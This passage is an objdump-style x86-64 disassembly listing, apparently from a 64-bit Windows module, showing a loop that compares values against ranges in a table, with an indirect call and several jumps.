   18000510e:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180005113:	ff 15 ef f0 00 00    	call   *0xf0ef(%rip)        # 0x180014208
   180005119:	e8 62 05 00 00       	call   0x180005680
   18000511e:	ff c6                	inc    %esi
   180005120:	e9 35 ff ff ff       	jmp    0x18000505a
   180005125:	33 c0                	xor    %eax,%eax
   180005127:	e9 b5 00 00 00       	jmp    0x1800051e1
   18000512c:	49 8b 76 20          	mov    0x20(%r14),%rsi
   180005130:	41 8b 7e 48          	mov    0x48(%r14),%edi
   180005134:	49 2b f4             	sub    %r12,%rsi
   180005137:	e9 96 00 00 00       	jmp    0x1800051d2
   18000513c:	8b cf                	mov    %edi,%ecx
   18000513e:	48 03 c9             	add    %rcx,%rcx
   180005141:	8b 44 cb 04          	mov    0x4(%rbx,%rcx,8),%eax
   180005145:	4c 3b f8             	cmp    %rax,%r15
   180005148:	0f 82 82 00 00 00    	jb     0x1800051d0
   18000514e:	8b 44 cb 08          	mov    0x8(%rbx,%rcx,8),%eax
   180005152:	4c 3b f8             	cmp    %rax,%r15
   180005155:	73 79                	jae    0x1800051d0
   180005157:	44 8b 55 04          	mov    0x4(%rbp),%r10d
   18000515b:	41 83 e2 20          	and    $0x20,%r10d
   18000515f:	74 44                	je     0x1800051a5
   180005161:	45 33 c9             	xor    %r9d,%r9d
   180005164:	85 d2                	test   %edx,%edx
   180005166:	74 38                	je     0x1800051a0
   180005168:	45 8b c1             	mov    %r9d,%r8d
   18000516b:	4d 03 c0             	add    %r8,%r8
   18000516e:	42 8b 44 c3 04       	mov    0x4(%rbx,%r8,8),%eax
   180005173:	48 3b f0             	cmp    %rax,%rsi
   180005176:	72 20                	jb     0x180005198
   180005178:	42 8b 44 c3 08       	mov    0x8(%rbx,%r8,8),%eax
   18000517d:	48 3b f0             	cmp    %rax,%rsi
